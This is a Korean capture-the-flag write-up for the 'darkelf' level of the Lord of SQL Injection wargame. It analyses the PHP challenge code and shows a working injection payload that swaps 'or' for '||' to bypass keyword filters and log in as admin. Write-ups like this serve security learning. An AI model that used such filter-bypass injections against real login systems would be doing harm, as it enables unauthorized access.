# Lord of SQL Injection No.6 - darkelf

## 문제 출제 의도

or, and를 사용하지 않고 원하는 문자열을 SELECT 하도록 SQL을 조작할 수 있는지 확인한다.

## 소스 코드 분석

darkelf 문제의 php 소스 코드는 다음과 같다.
```php
<?php 
  include "./config.php"; 
  login_chk(); 
  dbconnect();  
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
  if(preg_match('/or|and/i', $_GET[pw])) exit("HeHe"); 
  $query = "select id from prob_darkelf where id='guest' and pw='{$_GET[pw]}'"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
  if($result['id'] == 'admin') solve("darkelf"); 
  highlight_file(__FILE__); 
?>
```
-----

```php
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
  if(preg_match('/or|and/i', $_GET[pw])) exit("HeHe"); 
```
* GET방식으로 pw를 받고, pw에 `prob`, `_`, `.`, `()` 가 들어 있으면 `No Hack ~_~`이 뜨고 문제 풀이에 실패한다.

* 또한, pw에 대소문자 구분 없이 `or`, `and` 가 들어 있으면 `HeHe`가 뜨고 문제 풀이에 실패한다.

```php
  $query = "select id from prob_darkelf where id='guest' and pw='{$_GET[pw]}'";
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
  if($result['id'] == 'admin') solve("darkelf"); 
```
* 받은 pw가 직접 쿼리에 들어간다. 이것으로 SQL Injection 공격이 가능하다는 것을 알 수 있다.

* 문제 풀이가 성공하는 조건은 '데이터베이스에서 받은 id에 "admin"이라는 값이 들어있음'이다.

-----

## Solution
    
1. `||`, `&&` 이용

    논리 연산을 막기 위해 `OR`, `AND`를 필터링 한 문제이다.

    그러나 논리 연산은 위 두 연산자 뿐만 아니라 `||`, `&&` 연산자도 존재한다.
    
    `OR`은 `||`로 완전히 대체 가능하고, `AND`는 `&&`로 완전히 대체 가능하다.

    이때, URL에 직접 SQL Injection을 수행하는 경우 `&` 문자는 그대로 삽입하면 작동하지 않으므로 URL Encoding을 거친 `%26` 으로 삽입하여야 한다.

    ```
    http://los.eagle-jump.org/darkelf_6e50323a0bfccc2f3daf4df731651f75.php?pw=' || id='admin'-- -
    ```
    ```sql
    select id from prob_darkelf where id='guest' and pw='' || id='admin'-- -'
    ```

    이는 $result['id']에 'admin'이 들어가도록 하므로 문제가 풀린다.
